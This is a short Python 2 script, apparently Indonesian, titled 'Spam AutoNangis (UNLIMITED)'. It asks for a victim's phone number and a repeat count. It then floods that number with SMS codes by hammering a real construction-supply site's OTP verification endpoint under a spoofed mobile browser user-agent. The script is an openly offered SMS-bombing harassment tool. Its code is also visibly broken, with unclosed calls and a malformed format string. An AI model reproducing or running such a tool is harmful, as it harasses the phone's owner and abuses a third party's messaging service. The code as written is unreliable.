# -*- coding: utf8 -*-
# Hey, bro 😄
import os, sys, json
import requests as r
try:
 os.system("clear")
 banner = """
 \033[1;97m
 ==================================================
 Author    \033[1;91m:\033[1;96mRyzz03\033[1;97m
 WhatsApp  \033[1;91m:\033[1;96m+6282192959xxx\033[1;97m
 Script    \033[1;91m:\033[1;92mSpam AutoNangis (UNLIMITED)\033[1;97m
 ==================================================
 """
 print (banner)
 gg = raw_input("\033[1;97m[?] Nomornya? (ex:08xxx) : "
 gi = int(raw_input("\033[1;97m[?] Mau ngirim berapa kak? : "
 c = 1
 for x in range(gi):
  h = json.loads(r.post("https://www.sobatbangun.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=\033[1;97m "%gg,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
  if h["status"] == 'success':
   print "\033[1;97m[+] BERHASIL \033[1;91mdi kirim ke"
   c += 1
  else:
   print "\033[1;96m[×] GAGAL \033[1;91mdi kirim ke"
   c += 1
# print (h)
except r.exceptions.ConnectionError:
   print "\033[1;91m[!]\033[1;96mYahh, Jaringan nya lemot :("
except KeyboardInterrupt:
   print "\r\033[1;91m[-]\033[1;96mNjirt, keluar sendiri ;("
